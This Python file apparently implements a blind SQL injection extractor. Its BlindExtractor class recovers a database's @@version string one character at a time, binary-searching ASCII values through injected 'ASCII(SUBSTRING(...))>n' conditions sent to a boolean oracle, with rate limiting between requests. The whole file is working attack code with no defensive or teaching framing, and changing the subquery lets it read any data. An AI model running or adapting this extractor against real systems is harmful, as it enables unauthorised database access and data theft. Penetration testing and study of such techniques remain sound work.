from __future__ import annotations

import time
from collections.abc import Callable
from dataclasses import dataclass


@dataclass(frozen=True, slots=True)
class ExtractionResult:
    value: str
    requests: int
    complete: bool


class BlindExtractor:
    def __init__(
        self,
        oracle: Callable[[str], bool],
        *,
        max_length: int = 32,
        rate_limit: float = 5.0,
        minimum_ascii: int = 0,
        maximum_ascii: int = 126,
        sleep: Callable[[float], None] = time.sleep,
    ):
        self.oracle = oracle
        self.max_length = max_length
        self.rate_limit = rate_limit
        self.minimum_ascii = minimum_ascii
        self.maximum_ascii = maximum_ascii
        self._sleep = sleep
        self._last_request = 0.0
        self.requests = 0

    def extract_version(self) -> ExtractionResult:
        value: list[str] = []
        terminated = False
        for position in range(1, self.max_length + 1):
            low = self.minimum_ascii
            high = self.maximum_ascii
            while low <= high:
                middle = (low + high) // 2
                condition = (
                    f"ASCII(SUBSTRING((@@version),{position},1))>{middle}"
                )
                if self._ask(condition):
                    low = middle + 1
                else:
                    high = middle - 1
            code = low
            if code == 0:
                terminated = True
                break
            if code < 32 or code > self.maximum_ascii:
                break
            value.append(chr(code))
        return ExtractionResult(
            value="".join(value),
            requests=self.requests,
            complete=terminated or len(value) == self.max_length,
        )

    def _ask(self, condition: str) -> bool:
        if self.rate_limit > 0:
            interval = 1.0 / self.rate_limit
            elapsed = time.monotonic() - self._last_request
            if elapsed < interval:
                self._sleep(interval - elapsed)
        self._last_request = time.monotonic()
        self.requests += 1
        return bool(self.oracle(condition))
